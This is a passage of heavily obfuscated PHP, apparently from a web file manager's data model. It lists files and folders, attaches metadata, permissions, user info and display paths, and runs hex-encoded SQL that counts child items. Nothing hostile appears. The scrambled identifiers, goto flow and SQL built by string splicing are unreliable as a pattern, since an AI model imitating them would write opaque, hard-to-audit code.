$døÑ¤§Ğ‰¥) { $FôÄ˜ß = $døÑ¤§Ğ‰¥[$AÒ¦¹Ç…œ£[378]] == 1 ? $AÒ¦¹Ç…œ£[84] : $AÒ¦¹Ç…œ£[83]; $fÒŒ„Œºƒö[$FôÄ˜ß][] = $døÑ¤§Ğ‰¥; } unset($fÒŒ„Œºƒö[$AÒ¦¹Ç…œ£[363]]); } protected function _listAppendMeta(&$E–êì‡¶, $EÃ ¿‡ä¾) { goto D°ÎóØ¶Ø; dÖæ«‰ÎÃÑ: foreach ($dí®ª•‘‡ß as $eòˆÙîÏ) { if (!isset($eƒâŸ…øõ[$eòˆÙîÏ[$b¾Öó×Î•­[377]]])) { $eƒâŸ…øõ[$eòˆÙîÏ[$b¾Öó×Î•­[377]]] = array(); } if (in_array($eòˆÙîÏ[$b¾Öó×Î•­[99]], $a¿ˆ³Øµó¾)) { continue; } $eƒâŸ…øõ[$eòˆÙîÏ[$b¾Öó×Î•­[377]]][$eòˆÙîÏ[$b¾Öó×Î•­[99]]] = $eòˆÙîÏ[$b¾Öó×Î•­[368]]; } foreach ($E–êì‡¶ as &$C »—ÀÔæ) { $C »—ÀÔæ[$b¾Öó×Î•­[425]] = !1; if (isset($eƒâŸ…øõ[$C »—ÀÔæ[$b¾Öó×Î•­[377]]])) { $C »—ÀÔæ[$b¾Öó×Î•­[425]] = $eƒâŸ…øõ[$C »—ÀÔæ[$b¾Öó×Î•­[377]]]; } if ($this->fileIsLock($C »—ÀÔæ) && $C »—ÀÔæ[$b¾Öó×Î•­[384]]) { $CÏĞ¯‡è„‰ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $C »—ÀÔæ[$b¾Öó×Î•­[384]][$b¾Öó×Î•­[385]] = AuthModel::authDisable($C »—ÀÔæ[$b¾Öó×Î•­[384]][$b¾Öó×Î•­[385]], $CÏĞ¯‡è„‰); $C »—ÀÔæ[$b¾Öó×Î•­[384]][$b¾Öó×Î•­[426]][$b¾Öó×Î•­[384]] = $C »—ÀÔæ[$b¾Öó×Î•­[384]][$b¾Öó×Î•­[385]]; } } goto f¦œùÕ™¿ğ; FÂôÇõù‰Ç: if (!$dí®ª•‘‡ß) { return; } $a¿ˆ³Øµó¾ = array($b¾Öó×Î•­[423], $b¾Öó×Î•­[424]); $eƒâŸ…øõ = array(); goto dÖæ«‰ÎÃÑ; D°ÎóØ¶Ø: $b¾Öó×Î•­ =& $_SERVER[¶ªÕß‚ØÁŸ]; $d²öäÛ‚Óù = array($b¾Öó×Î•­[391] => array($b¾Öó×Î•­[392], $EÃ ¿‡ä¾)); $dí®ª•‘‡ß = Model($b¾Öó×Î•­[421])->field($b¾Öó×Î•­[422])->where($d²öäÛ‚Óù)->select(); goto FÂôÇõù‰Ç; f¦œùÕ™¿ğ: } protected function _listAppendFileMeta(&$DÕ¯›©¢¸â, $B¿é¾¦øŞ) { goto d­Ê„ÀˆÏ; F…™¨ù²®Ö: $e¢ˆƒ‹Ö¸Ò = Model($eË–×…”ğƒ[430])->field($Eã’ ¿—¹Œ)->where($EÓÏöˆ¶ Æ)->select(); $e¢ˆƒ‹Ö¸Ò = array_to_keyvalue($e¢ˆƒ‹Ö¸Ò, $eË–×…”ğƒ[427]); $D™·ïë· = Model($eË–×…”ğƒ[431])->field($eË–×…”ğƒ[432])->where($EÓÏöˆ¶ Æ)->select(); goto AËííŠ¨·; F’Üá”Áè¨: if (!$C¾Ùîµß²) { return; } $EÓÏöˆ¶ Æ = array($eË–×…”ğƒ[428] => array($eË–×…”ğƒ[392], $C¾Ùîµß²)); $Eã’ ¿—¹Œ = $eË–×…”ğƒ[429]; goto F…™¨ù²®Ö; d­Ê„ÀˆÏ: $eË–×…”ğƒ =& $_SERVER[¶ªÕß‚ØÁŸ]; $C¾Ùîµß² = array_to_keyvalue($DÕ¯›©¢¸â, $eË–×…”ğƒ[33], $eË–×…”ğƒ[427]); $C¾Ùîµß² = array_filter(array_unique($C¾Ùîµß²)); goto F’Üá”Áè¨; b×›œóñ½: foreach ($DÕ¯›©¢¸â as &$Aİ±á¬ŒÕñ) { goto Dá³††…óõ; f±ª©„ ’¯: $e÷œËÃ¿ëÑ[$eË–×…”ğƒ[87]] = $Aİ±á¬ŒÕñ[$eË–×…”ğƒ[87]]; $e÷œËÃ¿ëÑ[$eË–×…”ğƒ[28]] = $Aİ±á¬ŒÕñ[$eË–×…”ğƒ[28]]; self::$cacheFileInfo[$eË–×…”ğƒ[433] . $fšƒôå÷¸] = $e÷œËÃ¿ëÑ; goto eõ‚–æò²Á; Dá³††…óõ: $fšƒôå÷¸ = $Aİ±á¬ŒÕñ[$eË–×…”ğƒ[427]]; if (!$fšƒôå÷¸ || !isset($e¢ˆƒ‹Ö¸Ò[$fšƒôå÷¸])) { continue; } $e÷œËÃ¿ëÑ = $e¢ˆƒ‹Ö¸Ò[$fšƒôå÷¸]; goto f±ª©„ ’¯; dº¢‹¾éÚ÷: if (isset($Aİ±á¬ŒÕñ[$eË–×…”ğƒ[172]][$eË–×…”ğƒ[434]])) { $Aİ±á¬ŒÕñ[$eË–×…”ğƒ[434]] = json_decode($Aİ±á¬ŒÕñ[$eË–×…”ğƒ[172]][$eË–×…”ğƒ[434]], !0); unset($Aİ±á¬ŒÕñ[$eË–×…”ğƒ[172]][$eË–×…”ğƒ[434]]); } goto D­òÑÃ¥÷¶; eõ‚–æò²Á: unset($e¢ˆƒ‹Ö¸Ò[$fšƒôå÷¸][$eË–×…”ğƒ[85]]); $AØ´›†…Åà = is_array($Cƒ¼…ãøâ¤[$fšƒôå÷¸]) ? $Cƒ¼…ãøâ¤[$fšƒôå÷¸] : array(); $Aİ±á¬ŒÕñ[$eË–×…”ğƒ[172]] = array_merge($AØ´›†…Åà, $e¢ˆƒ‹Ö¸Ò[$fšƒôå÷¸]); goto dº¢‹¾éÚ÷; D­òÑÃ¥÷¶: } goto a®ÑÖ§Œš; AËííŠ¨·: $D™·ïë· = $D™·ïë· ? $D™·ïë· : array(); $Cƒ¼…ãøâ¤ = array(); foreach ($D™·ïë· as $dÚ¦î¹º™ó) { if (!isset($Cƒ¼…ãøâ¤[$dÚ¦î¹º™ó[$eË–×…”ğƒ[427]]])) { $Cƒ¼…ãøâ¤[$dÚ¦î¹º™ó[$eË–×…”ğƒ[427]]] = array(); } $Cƒ¼…ãøâ¤[$dÚ¦î¹º™ó[$eË–×…”ğƒ[427]]][$dÚ¦î¹º™ó[$eË–×…”ğƒ[99]]] = $dÚ¦î¹º™ó[$eË–×…”ğƒ[368]]; } goto b×›œóñ½; a®ÑÖ§Œš: } protected function _listAppendSourceInfo(&$A’óØÖÎàß, $E´½î™ê³) { goto bù†¥É£ëÁ; aÕÉçÉØ‡•: $B¿¬¤Î¨¼ = array_to_keyvalue($A‚Ä‚èàö“, $Bµ£¹‡ÅÍç[375]); $EôãËÉ‰Û = array_to_keyvalue_group($fÓßÁù›ï”, $Bµ£¹‡ÅÍç[85], $Bµ£¹‡ÅÍç[401]); $DÆ¤ Ï”Ì = array_to_keyvalue($d¹å¥Š§é, $Bµ£¹‡ÅÍç[85]); goto F±Î¹ãÖ ; F±Î¹ãÖ : $EåÇÅ†‘„ = array_to_keyvalue_group($Fì¾İÜ˜ññ, $Bµ£¹‡ÅÍç[377]); foreach ($A’óØÖÎàß as &$BÒø¿™Éí) { $BÒø¿™Éí[$Bµ£¹‡ÅÍç[399]] = array($Bµ£¹‡ÅÍç[438] => 0, $Bµ£¹‡ÅÍç[439] => 0, $Bµ£¹‡ÅÍç[440] => 0); if (isset($DÆ¤ Ï”Ì[$BÒø¿™Éí[$Bµ£¹‡ÅÍç[377]]])) { $BÒø¿™Éí[$Bµ£¹‡ÅÍç[399]][$Bµ£¹‡ÅÍç[441]] = 1; $BÒø¿™Éí[$Bµ£¹‡ÅÍç[399]][$Bµ£¹‡ÅÍç[442]] = $DÆ¤ Ï”Ì[$BÒø¿™Éí[$Bµ£¹‡ÅÍç[377]]][$Bµ£¹‡ÅÍç[28]]; } if (isset($EôãËÉ‰Û[$BÒø¿™Éí[$Bµ£¹‡ÅÍç[377]]])) { $BÒø¿™Éí[$Bµ£¹‡ÅÍç[399]][$Bµ£¹‡ÅÍç[443]] = array(); foreach ($EôãËÉ‰Û[$BÒø¿™Éí[$Bµ£¹‡ÅÍç[377]]] as $díéŞùÁ÷) { $Cïä­®‘Í = $B¿¬¤Î¨¼[$díéŞùÁ÷]; $BÒø¿™Éí[$Bµ£¹‡ÅÍç[399]][$Bµ£¹‡ÅÍç[443]][] = array($Bµ£¹‡ÅÍç[444] => $Cïä­®‘Í[$Bµ£¹‡ÅÍç[375]], $Bµ£¹‡ÅÍç[394] => $Cïä­®‘Í[$Bµ£¹‡ÅÍç[28]], $Bµ£¹‡ÅÍç[445] => $Cïä­®‘Í[$Bµ£¹‡ÅÍç[446]]); } } if (isset($EåÇÅ†‘„[$BÒø¿™Éí[$Bµ£¹‡ÅÍç[377]]])) { $BÒø¿™Éí[$Bµ£¹‡ÅÍç[399]][$Bµ£¹‡ÅÍç[447]] = array(); foreach ($EåÇÅ†‘„[$BÒø¿™Éí[$Bµ£¹‡ÅÍç[377]]] as $A¨Éë†Å»À) { $BÒø¿™Éí[$Bµ£¹‡ÅÍç[399]][$Bµ£¹‡ÅÍç[447]] = array($Bµ£¹‡ÅÍç[448] => $A¨Éë†Å»À[$Bµ£¹‡ÅÍç[449]], $Bµ£¹‡ÅÍç[450] => $A¨Éë†Å»À[$Bµ£¹‡ÅÍç[451]], $Bµ£¹‡ÅÍç[452] => $A¨Éë†Å»À[$Bµ£¹‡ÅÍç[377]], $Bµ£¹‡ÅÍç[453] => $A¨Éë†Å»À[$Bµ£¹‡ÅÍç[454]], $Bµ£¹‡ÅÍç[455] => $A¨Éë†Å»À[$Bµ£¹‡ÅÍç[456]]); } } } return $A’óØÖÎàß; goto fÑ™Ö­‡ƒ´; bù†¥É£ëÁ: $Bµ£¹‡ÅÍç =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!defined($Bµ£¹‡ÅÍç[435])) { return; } $A‚Ä‚èàö“ = Model($Bµ£¹‡ÅÍç[436])->listData(); goto Dß§Å´ÛŠ¢; Dß§Å´ÛŠ¢: $fÓßÁù›ï” = Model($Bµ£¹‡ÅÍç[400])->listData(); $d¹å¥Š§é = Model($Bµ£¹‡ÅÍç[389])->listData(); $Fì¾İÜ˜ññ = Model($Bµ£¹‡ÅÍç[437])->listSimple(); goto aÕÉçÉØ‡•; fÑ™Ö­‡ƒ´: } protected function _listAppendChildren(&$Béø¸àİâò, $dĞ…¦ƒÎ‹¯) { goto cî†‹º½ô; aÜ°½’¸Ş : $b¤ùà®Ã‘õ = 1024 * 50; $Béø¸àİâò = is_array($Béø¸àİâò) ? $Béø¸àİâò : array(); $BÆ²²áŠğ„ = count($Béø¸àİâò); goto A»¹İî¨Öå; fÛ†çò°°: foreach ($Béø¸àİâò as &$D³«šÈÕçì) { if ($D³«šÈÕçì[$bŒĞËÇœ [378]]) { unset($D³«šÈÕçì[$bŒĞËÇœ [380]]); $D³«šÈÕçì[$bŒĞËÇœ [202]] = intval($aê¨¯‡[$D³«šÈÕçì[$bŒĞËÇœ [377]] . $bŒĞËÇœ [459]][$bŒĞËÇœ [460]]); $D³«šÈÕçì[$bŒĞËÇœ [201]] = intval($aê¨¯‡[$D³«šÈÕçì[$bŒĞËÇœ [377]] . $bŒĞËÇœ [461]][$bŒĞËÇœ [460]]); } } goto e‘‚Â›Ğ—·; A»¹İî¨Öå: $dí‘ŸÌÛ = $this->tablePrefix . $this->tableName; for ($d„É©¸®» = 0; $d„É©¸®» < $BÆ²²áŠğ„; $d„É©¸®»++) { $E‘¡±ƒäÅ = intval($Béø¸àİâò[$d„É©¸®»][$bŒĞËÇœ [405]]); if ($Béø¸àİâò[$d„É©¸®»][$bŒĞËÇœ [378]]) { $F ã»‡õŒÕ = $Béø¸àİâò[$d„É©¸®»][$bŒĞËÇœ [377]]; $Dß¡ä´‡Âù .= "\123\105\114\105\x43\x54\40\52\40\106\122\x4f\115\x20\x28\x53\105\x4c\105\103\x54\40\47{$F ã»‡õŒÕ}\x5f\x68\141\x73\106\151\154\145\47\x20\x61\x73\40\x68\141\x73\x2c\x63\x6f\x75\156\164\50\61\51\x20\x61\x73\x20\150\141\x73\x43\157\165\x6e\164\40\106\122\x4f\x4d\x20\140{$dí‘ŸÌÛ}\140\40\12\11\x9\11\11\11\167\150\x65\162\x65\x20\160\141\x72\145\156\164\x49\104\75{$F ã»‡õŒÕ}\x20\x61\x6e\144\x20\151\x73\x46\x6f\154\144\x65\162\x3d\x30\x20\x61\x6e\x64\40\x69\x73\x44\x65\x6c\145\164\x65\x3d{$E‘¡±ƒäÅ}\51\40\x61\x73\40\x74\x62\61\x5f{$F ã»‡õŒÕ}\x20\165\156\151\157\156\x20\141\154\x6c\x20\12\11\11\11\11\x9\123\105\x4c\105\103\124\x20\52\40\x46\122\117\115\x20\x28\123\105\114\105\103\124\40\x27{$F ã»‡õŒÕ}\x5f\150\141\x73\106\157\x6c\x64\145\x72\47\x20\141\163\x20\150\141\163\x46\151\x6c\x65\54\143\x6f\x75\156\164\50\x31\x29\x20\x61\163\40\x68\x61\x73\x43\157\x75\156\x74\x20\x46\x52\117\115\40\140{$dí‘ŸÌÛ}\x60\40\xa\11\11\11\x9\x9\x77\x68\x65\162\145\x20\160\x61\162\x65\156\x74\x49\104\75{$F ã»‡õŒÕ}\40\x61\156\144\x20\151\163\x46\157\154\x64\145\x72\x3d\61\40\141\156\144\x20\151\x73\x44\145\x6c\145\x74\145\x3d{$E‘¡±ƒäÅ}\51\40\141\x73\40\x74\x62\x32\x5f{$F ã»‡õŒÕ}\40\165\156\151\x6f\156\40\x61\x6c\154\40"; } if ((strlen($Dß¡ä´‡Âù) >= $b¤ùà®Ã‘õ || $d„É©¸®» == $BÆ²²áŠğ„ - 1) && $Dß¡ä´‡Âù) { $Dß¡ä´‡Âù = substr($Dß¡ä´‡Âù, 0, -strlen($bŒĞËÇœ [457])); $AïÃİ™›ÍÓ = $this->query($Dß¡ä´‡Âù); $aê¨¯‡ = array_merge($aê¨¯‡, $AïÃİ™›ÍÓ); $Dß¡ä´‡Âù = $bŒĞËÇœ [33]; } } $aê¨¯‡ = array_to_keyvalue($aê¨¯‡, $bŒĞËÇœ [458]); goto fÛ†çò°°; cî†‹º½ô: $bŒĞËÇœ  =& $_SERVER[¶ªÕß‚ØÁŸ]; $Dß¡ä´‡Âù = $bŒĞËÇœ [66]; $aê¨¯‡ = array(); goto aÜ°½’¸Ş ; e‘‚Â›Ğ—·: } protected function _listAppendAuth(&$dÑ×Ñ–è¿) { goto d¢ŒÎË»ÈÕ; a‡Ñ‡¶­‹‰: foreach ($dÑ×Ñ–è¿ as $A¥‘í£÷Ì’) { if ($A¥‘í£÷Ì’[$BÌÇöçï—¤[379]] == self::TYPE_GROUP) { $A“Ï¯´†Áª[] = $A¥‘í£÷Ì’[$BÌÇöçï—¤[377]]; } } if (!$A“Ï¯´†Áª) { return; } $D·¥åÏ…á¼ = array_to_keyvalue($dÑ×Ñ–è¿, $BÌÇöçï—¤[377]); goto C‡Áƒ¸Ÿ¥ƒ; C‡Áƒ¸Ÿ¥ƒ: $BˆŞ‡™¸ä‹ = Model($BÌÇöçï—¤[462])->getSourceList($A“Ï¯´†Áª, $D·¥åÏ…á¼); foreach ($dÑ×Ñ–è¿ as $DØİƒù´øº => &$A¥‘í£÷Ì’) { $A¥‘í£÷Ì’[$BÌÇöçï—¤[384]] = $BˆŞ‡™¸ä‹[$A¥‘í£÷Ì’[$BÌÇöçï—¤[377]]]; if (!$A¥‘í£÷Ì’[$BÌÇöçï—¤[384]] && $A¥‘í£÷Ì’[$BÌÇöçï—¤[379]] == self::TYPE_GROUP) { $A¥‘í£÷Ì’[$BÌÇöçï—¤[384]] = Action($BÌÇöçï—¤[463])->pathGroupAuthMake($A¥‘í£÷Ì’[$BÌÇöçï—¤[464]]); if (!$A¥‘í£÷Ì’[$BÌÇöçï—¤[384]] && !_get($GLOBALS, $BÌÇöçï—¤[465])) { $A¥‘í£÷Ì’[$BÌÇöçï—¤[199]] = !1; $A¥‘í£÷Ì’[$BÌÇöçï—¤[198]] = !1; } } if ($A¥‘í£÷Ì’[$BÌÇöçï—¤[384]]) { $A¥‘í£÷Ì’[$BÌÇöçï—¤[199]] = AuthModel::authCheckEdit($A¥‘í£÷Ì’[$BÌÇöçï—¤[384]][$BÌÇöçï—¤[385]]); $A¥‘í£÷Ì’[$BÌÇöçï—¤[198]] = AuthModel::authCheckView($A¥‘í£÷Ì’[$BÌÇöçï—¤[384]][$BÌÇöçï—¤[385]]); } $this->groupPathDisplay($A¥‘í£÷Ì’); } goto D­ôéğĞ‰ö; d¢ŒÎË»ÈÕ: $BÌÇöçï—¤ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!defined($BÌÇöçï—¤[435])) { return; } $A“Ï¯´†Áª = array(); goto a‡Ñ‡¶­‹‰; D­ôéğĞ‰ö: } public function groupPathDisplay(&$c„ĞÅêÃô) { goto aßƒóÇã Ó; bùšÎã¿Ú: $fó·¨Û£› = $this->parentLevelArray($d±»Ú¨…á¬[$eÀÏ™ÁæË[467]]); $aåÌ¤¾¿¦Ô = $eÀÏ™ÁæË[33]; foreach ($fó·¨Û£› as $a¥Öã‘Æì) { $EÌíöã’Ú± = Model($eÀÏ™ÁæË[466])->getInfo($a¥Öã‘Æì); $aåÌ¤¾¿¦Ô .= $EÌíöã’Ú±[$eÀÏ™ÁæË[399]][$eÀÏ™ÁæË[377]] . $eÀÏ™ÁæË[47]; } goto BÄ§’à‡‚; aßƒóÇã Ó: $eÀÏ™ÁæË =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($c„ĞÅêÃô[$eÀÏ™ÁæË[379]] != self::TYPE_GROUP) { return; } $d±»Ú¨…á¬ = Model($eÀÏ™ÁæË[466])->getInfo($c„ĞÅêÃô[$eÀÏ™ÁæË[464]]); goto bùšÎã¿Ú; BÄ§’à‡‚: $c„ĞÅêÃô[$eÀÏ™ÁæË[468]] = $d±»Ú¨…á¬[$eÀÏ™ÁæË[469]]; $c„ĞÅêÃô[$eÀÏ™ÁæË[388]] = $d±»Ú¨…á¬[$eÀÏ™ÁæË[467]]; $c„ĞÅêÃô[$eÀÏ™ÁæË[470]] = $d±»Ú¨…á¬[$eÀÏ™ÁæË[471]]; goto E™œä©ªÄ¯; E™œä©ªÄ¯: $c„ĞÅêÃô[$eÀÏ™ÁæË[472]] = $aåÌ¤¾¿¦Ô . $d±»Ú¨…á¬[$eÀÏ™ÁæË[399]][$eÀÏ™ÁæË[377]]; goto D”–ò‹á‹Ñ; D”–ò‹á‹Ñ: } protected function _listAppendPath(&$Däœ¢”©í‰) { goto A¦÷É¬¼‡Ä; aÕÂÀé±‚§: $eŒ¡Ÿ’ƒ½Ô = array(); foreach ($Dïå×°±Š‡ as $C¸²Á®ˆ… => $D¢ë‹Ú†ÇÀ) { if (!$D¢ë‹Ú†ÇÀ) { $eŒ¡Ÿ’ƒ½Ô[] = $C¸²Á®ˆ…; } } if ($eŒ¡Ÿ’ƒ½Ô) { $b÷¿ÕÏ— = array($B¦ŒôÍŒ[391] => array($B¦ŒôÍŒ[392], $eŒ¡Ÿ’ƒ½Ô)); if (count($eŒ¡Ÿ’ƒ½Ô) == 1) { $fÎœòÛ¿¡ó = $this->sourceInfo($eŒ¡Ÿ’ƒ½Ô[0]); $fÎœòÛ¿¡ó = is_array($fÎœòÛ¿¡ó) ? array($fÎœòÛ¿¡ó) : !1; } else { $fÎœòÛ¿¡ó = $this->field($B¦ŒôÍŒ[473])->where($b÷¿ÕÏ—)->select(); } $cÍçëß‰ = array_to_keyvalue($fÎœòÛ¿¡ó, $B¦ŒôÍŒ[377], $B¦ŒôÍŒ[28]); $Dïå×°±Š‡ = array_merge_index($Dïå×°±Š‡, $cÍçëß‰); } goto AĞóÅĞ®æå; A¦÷É¬¼‡Ä: $B¦ŒôÍŒ =& $_SERVER[¶ªÕß‚ØÁŸ]; $Dïå×°±Š‡ = array(); foreach ($Däœ¢”©í‰ as &$eªŠÈÑ”—ñ) { $Dïå×°±Š‡[$eªŠÈÑ”—ñ[$B¦ŒôÍŒ[377]]] = $eªŠÈÑ”—ñ[$B¦ŒôÍŒ[28]]; $c¸âììà‘ = $this->parentLevelArray($eªŠÈÑ”—ñ[$B¦ŒôÍŒ[467]]); array_shift($c¸âììà‘); foreach ($c¸âììà‘ as $b¨æ¼ÕÉš‰) { if (!isset($Dïå×°±Š‡[$b¨æ¼ÕÉš‰])) { $Dïå×°±Š‡[$b¨æ¼ÕÉš‰] = 0; } } } goto aÕÂÀé±‚§; AĞóÅĞ®æå: $c¦Àëà÷½² = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($Däœ¢”©í‰ as &$eªŠÈÑ”—ñ) { goto DÜø×Æ¢äñ; eçƒ¶å˜ß¯: $Dá”Ï‹ãõÂ = trim($eªŠÈÑ”—ñ[$B¦ŒôÍŒ[474]], $B¦ŒôÍŒ[8]); if ($eªŠÈÑ”—ñ[$B¦ŒôÍŒ[469]] == $B¦ŒôÍŒ[476] && $Dá”Ï‹ãõÂ) { $eªŠÈÑ”—ñ[$B¦ŒôÍŒ[28]] = $Dá”Ï‹ãõÂ; } $this->_listAppendPathRecycle($eªŠÈÑ”—ñ, $c¸âììà‘, $c¦Àëà÷½²); goto e¥ÁÄÂ§İ‘; Dâó»ÌÂâØ: if ($c¸âììà‘) { $E†éø‹Ñ .= $eªŠÈÑ”—ñ[$B¦ŒôÍŒ[28]]; } if ($eªŠÈÑ”—ñ[$B¦ŒôÍŒ[378]]) { $E†éø‹Ñ .= $B¦ŒôÍŒ[8]; } $eªŠÈÑ”—ñ[$B¦ŒôÍŒ[474]] = str_replace($B¦ŒôÍŒ[475], $B¦ŒôÍŒ[8], $E†éø‹Ñ); goto eçƒ¶å˜ß¯; DÜø×Æ¢äñ: $c¸âììà‘ = $this->parentLevelArray($eªŠÈÑ”—ñ[$B¦ŒôÍŒ[467]]); $E†éø‹Ñ = $this->_listAppendPathRoot($eªŠÈÑ”—ñ, $c¸âììà‘); foreach ($c¸âììà‘ as $b¨æ¼ÕÉš‰) { if (isset($Dïå×°±Š‡[$b¨æ¼ÕÉš‰])) { $E†éø‹Ñ .= $Dïå×°±Š‡[$b¨æ¼ÕÉš‰] . $B¦ŒôÍŒ[8]; } } goto Dâó»ÌÂâØ; e¥ÁÄÂ§İ‘: } goto Cğ‹ÂÕ‡¥–; Cğ‹ÂÕ‡¥–: } private function _listAppendPathRecycle(&$A‚İ¥›è¿, $BÒÏèóâ²®, $cÇÁàÎ¨‹) { goto Fô‚…öÛˆ; F¥ãÓ•ÓÆ¬: $Cô¶Ï“é¼Ë = explode($e—Óí‚”Ç[8], trim($A‚İ¥›è¿[$e—Óí‚”Ç[474]], $e—Óí‚”Ç[8])); $cèá™ëËÍš = implode($e—Óí‚”Ç[8], array_slice($Cô¶Ï“é¼Ë, 2)); $A‚İ¥›è¿[$e—Óí‚”Ç[474]] = $e—Óí‚”Ç[8] . LNG($e—Óí‚”Ç[477]) . $e—Óí‚”Ç[8] . ltrim($cèá™ëËÍš, $e—Óí‚”Ç[8]); goto fÑ±çÆ›; fÑ±çÆ›: $A‚İ¥›è¿[$e—Óí‚”Ç[467]] = $e—Óí‚”Ç[478] . implode($e—Óí‚”Ç[47], array_slice($BÒÏèóâ²®, 1)) . $e—Óí‚”Ç[47]; if ($A‚İ¥›è¿[$e—Óí‚”Ç[377]] == $cÇÁàÎ¨‹) { $A‚İ¥›è¿[$e—Óí‚”Ç[467]] = $e—Óí‚”Ç[478]; $A‚İ¥›è¿[$e—Óí‚”Ç[469]] = $e—Óí‚”Ç[476]; $A‚İ¥›è¿[$e—Óí‚”Ç[28]] = LNG($e—Óí‚”Ç[477]); } $A‚İ¥›è¿[$e—Óí‚”Ç[479]] = $e—Óí‚”Ç[480]; goto CÍÚß‚; Fô‚…öÛˆ: $e—Óí‚”Ç =& $_SERVER[¶ªÕß‚ØÁŸ]; if (intval($A‚İ¥›è¿[$e—Óí‚”Ç[379]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($cÇÁàÎ¨‹, $BÒÏèóâ²®) && $A‚İ¥›è¿[$e—Óí‚”Ç[377]] != $cÇÁàÎ¨‹) { return; } goto F¥ãÓ•ÓÆ¬; CÍÚß‚: } protected function _listAppendPathRoot(&$F°§·‰», $Dƒ£›†„è) { $eŞ¦‹ÃŸéŸ =& $_SERVER[¶ªÕß‚ØÁŸ]; $F—Æ„¨œŒ° = $eŞ¦‹ÃŸéŸ[33]; if ($F°§·‰»[$eŞ¦‹ÃŸéŸ[379]] == self::TYPE_USER) { if (defined($eŞ¦‹ÃŸéŸ[435]) && $F°§·‰»[$eŞ¦‹ÃŸéŸ[464]] == USER_ID) { $F—Æ„¨œŒ° = LNG($eŞ¦‹ÃŸéŸ[481]); if (!$Dƒ£›†„è) { $F°§·‰»[$eŞ¦‹ÃŸéŸ[28]] = $F—Æ„¨œŒ°; } } else { $E´ï†Ã—õ = Model($eŞ¦‹ÃŸéŸ[482])->getInfoSimple($F°§·‰»[$eŞ¦‹ÃŸéŸ[464]]); $F—Æ„¨œŒ° = LNG($eŞ¦‹ÃŸéŸ[483]) . $eŞ¦‹ÃŸéŸ[167] . $E´ï†Ã—õ[$eŞ¦‹ÃŸéŸ[28]] . $eŞ¦‹ÃŸéŸ[484]; } } else { if ($F°§·‰»[$eŞ¦‹ÃŸéŸ[379]] == self::TYPE_GROUP) { $E´ï†Ã—õ = Model($eŞ¦‹ÃŸéŸ[466])->getInfoSimple($F°§·‰»[$eŞ¦‹ÃŸéŸ[464]]); $F—Æ„¨œŒ° = $E´ï†Ã—õ[$eŞ¦‹ÃŸéŸ[28]]; } else { if ($F°§·‰»[$eŞ¦‹ÃŸéŸ[379]] == self::TYPE_SYSTEM) { $E´ï†Ã—õ = $this->sourceInfo($Dƒ£›†„è[0], !0); $F—Æ„¨œŒ° = $E´ï†Ã—õ[$eŞ¦‹ÃŸéŸ[28]]; } } } $F—Æ„¨œŒ° = $F—Æ„¨œŒ° ? $eŞ¦‹ÃŸéŸ[8] . $F—Æ„¨œŒ° . $eŞ¦‹ÃŸéŸ[8] : $eŞ¦‹ÃŸéŸ[8]; return $F—Æ„¨œŒ°; } protected function _listAppendUser(&$F®Î„èò˜ò) { $dâºšõæ =& $_SERVER[¶ªÕß‚ØÁŸ]; $Bø¢À†ŸĞø = array_to_keyvalue($F®Î„èò˜ò, $dâºšõæ[33], $dâºšõæ[386]); $eÉŠ„Ì‡ã = array_to_keyvalue($F®Î„èò˜ò, $dâºšõæ[33], $dâºšõæ[387]); $E¬ô¦¯èê» = array_merge($Bø¢À†ŸĞø, $eÉŠ„Ì‡ã); $D¸ò¯Ù”ŸÀ = Model($dâºšõæ[485])->userListInfo($E¬ô¦¯èê»); foreach ($F®Î„èò˜ò as &$BÜ—·ñ½§Ø) { $cæ“ÛßÅëˆ = $BÜ—·ñ½§Ø[$dâºšõæ[386]]; $BÜ—·ñ½§Ø[$dâºšõæ[386]] = $D¸ò¯Ù”ŸÀ[$cæ“ÛßÅëˆ] ? $D¸ò¯Ù”ŸÀ[$cæ“ÛßÅëˆ] : !1; $cæ“ÛßÅëˆ = $BÜ—·ñ½§Ø[$dâºšõæ[387]]; $BÜ—·ñ½§Ø[$dâºšõæ[387]] = $D¸ò¯Ù”ŸÀ[$cæ“ÛßÅëˆ] ? $D¸ò¯Ù”ŸÀ[$cæ“ÛßÅëˆ] : !1; if (isset($BÜ—·ñ½§Ø[$dâºšõæ[425]]) && $BÜ—·ñ½§Ø[$dâºšõæ[425]][$dâºšõæ[486]]) { $eŒ£•ñçÇº = $GLOBALS[$dâºšõæ[6]][$dâºšõæ[94]][$dâºšõæ[487]]; if ($BÜ—·ñ½§Ø[$dâºšõæ[425]][$dâºšõæ[488]] <= time() - $eŒ£•ñçÇº) { $this->metaSet($BÜ—·ñ½§Ø[$dâºšõæ[377]], $dâºšõæ[486], null); $this->metaSet($BÜ—·ñ½§Ø[$dâºšõæ[377]], $dâºšõæ[488], null); unset($BÜ—·ñ½§Ø[$dâºšõæ[425]][$dâºšõæ[486]]); continue; } $b‹ÕïïÁÖ = $BÜ—·ñ½§Ø[$dâºšõæ[425]][$dâºšõæ[486]]; $BÜ—·ñ½§Ø[$dâºšõæ[425]][$dâºšõæ[489]] = Model($dâºšõæ[485])->getInfoSimpleOuter($b‹ÕïïÁÖ); } } } public function parentLevelArray($Aœæ÷‰®³ß) { $f¥¨Ó½°¼± =& $_SERVER[¶ªÕß‚ØÁŸ]; $Aœæ÷‰®³ß = explode($f¥¨Ó½°¼±[47], trim($Aœæ÷‰®³ß, $f¥¨Ó½°¼±[47])); return array_remove_value($Aœæ÷‰®³ß, $f¥¨Ó½°¼±[476]); } public function listAll($Eµ¿’‚›…†) { goto c’¸ç¯¾ƒ; CÀ‚ŠÉ”’‘: $cŞ¥òŒŒò = $A……´ô—‡[494]; $b©‚È‡øÅ = "\114\105\x46\x54\x20\112\x4f\111\116\40{$this->tablePrefix}\x69\x6f\137\146\151\154\x65\x20\146\x69\x6c\145\40\x6f\156\x20\163\x6f\165\162\143\145\x2e\x66\151\154\x65\x49\x44\40\75\x20\146\x69\x6c\x65\56\146\151\154\145\111\104"; $C¤‚¡‰Ì§÷ = $this->alias($A……´ô—‡[495])->field($cŞ¥òŒŒò)->where($dš®¡„ç¡)->join($b©‚È‡øÅ)->select(); goto c½„À¨À¬‚; c’¸ç¯¾ƒ: $A……´ô—‡ =& 